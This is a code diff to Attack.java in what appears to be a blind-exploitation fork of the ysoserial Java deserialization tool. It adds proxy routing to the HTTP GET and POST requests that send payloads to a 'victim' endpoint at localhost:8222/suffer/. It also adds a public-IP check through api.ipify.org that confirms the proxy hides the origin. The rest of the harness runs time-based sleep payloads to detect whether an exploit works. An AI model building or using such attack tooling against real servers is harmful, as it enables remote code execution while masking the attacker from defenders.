@@ -2,6 +2,8 @@ package ysoserial.blind;
 
 import org.json.JSONObject;
 
+import java.net.InetSocketAddress;
+import java.net.Proxy;
 import java.net.URLEncoder;
 import java.util.*;
 import java.util.stream.Collectors;
@@ -38,10 +40,19 @@ public class Attack {
     public static final String ATTACK_METHOD = "POST";
 
     /**
+     * Proxy to be used in the requests.
+     */
+    private Proxy proxy = Proxy.NO_PROXY;
+
+    /**
      * Run basic tests against the host: java versions, OS detections,
      */
     public void dumpReport() throws Exception {
         final JSONObject sleepJson = AttackTools.payloadSleep(DEFAULT_SLEEP_TIME);
+
+        // Test our proxy server
+        final String publicIp = AttackUtils.httpGet("https://api.ipify.org", proxy);
+        log("Public IP address: %s", publicIp);
 
         // Basic sleep - does it work?
         final boolean sleep01Worked = applyPayloadOnVictim(sleepJson);
@@ -463,7 +474,7 @@ public class Attack {
             final String url = "http://localhost:8222/suffer/" + payloadUrlFriendly;
             timeStart = System.currentTimeMillis();
             try {
-                result = AttackUtils.httpGet(url);
+                result = AttackUtils.httpGet(url, proxy);
             } catch (Exception e) {
                 result = null;
                 log("Exception in get Req");
@@ -474,7 +485,7 @@ public class Attack {
             // the blind decision.
             timeStart = System.currentTimeMillis();
             try {
-                result = AttackUtils.httpPost("http://localhost:8222/suffer/", payloadUrlFriendly);
+                result = AttackUtils.httpPost("http://localhost:8222/suffer/", payloadUrlFriendly, proxy);
             } catch (Exception e) {
                 result = null;
                 log("Exception in post Req");
@@ -492,6 +503,14 @@ public class Attack {
 
     public void log(String fmt, Object ... args){
         System.out.println(String.format(fmt, args));
+    }
+
+    public Proxy getProxy() {
+        return proxy;
+    }
+
+    public void setProxy(Proxy proxy) {
+        this.proxy = proxy;
     }
 
     public static class RunResult {
